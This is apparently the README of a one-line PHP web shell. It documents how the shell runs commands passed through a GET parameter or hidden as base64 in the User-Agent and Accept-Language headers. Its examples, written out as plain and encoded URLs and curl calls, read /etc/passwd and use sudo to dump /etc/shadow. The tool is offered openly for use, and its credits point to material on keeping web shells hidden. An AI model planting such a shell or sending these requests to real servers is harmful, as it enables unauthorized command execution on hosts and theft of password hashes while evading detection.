# OLPWS
One Liner PHP Web Shell


## For testing
You can use the internal web server of PHP like this:

```bash
php -S localhost:[port] shell.php
```

## Features
It reads commands from:
* Using GET method: `$_GET['e']`
* Using HTTP User-Agent: define the user-agent header with a base64_encoded payload
* Using HTTP Accept-Language: define the accept-language header with a base64_encoded payload

It automaticaly detects and decode base64_encoded payloads.


## Examples
Somes examples:
* http://host:port/?e=cat%20/etc/passwd
* http://host:port/?e=Y2F0IC9ldGMvcGFzc3dk (the same but base64_encoded)
* Using cURL: `curl http://host:port -A Y2F0IC9ldGMvcGFzc3dk`
* http://host:port/?e=echo%20password%20|%20sudo%20-S%20cat%20/etc/shadow
* http://host:port/?e=ZWNobyBwYXNzd29yZCB8IHN1ZG8gLVMgY2F0IC9ldGMvc2hhZG93 (the same but base64_encoded)
* Using cURL: `curl http://host:port -A ZWNobyBwYXNzd29yZCB8IHN1ZG8gLVMgY2F0IC9ldGMvc2hhZG93`


## Credits
Ideas comes from:
* http://www.grobinson.me/single-line-php-script-to-gain-shell/
* https://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/
* https://stackoverflow.com/questions/2556345/detect-base64-encoding-in-php/47486214#47486214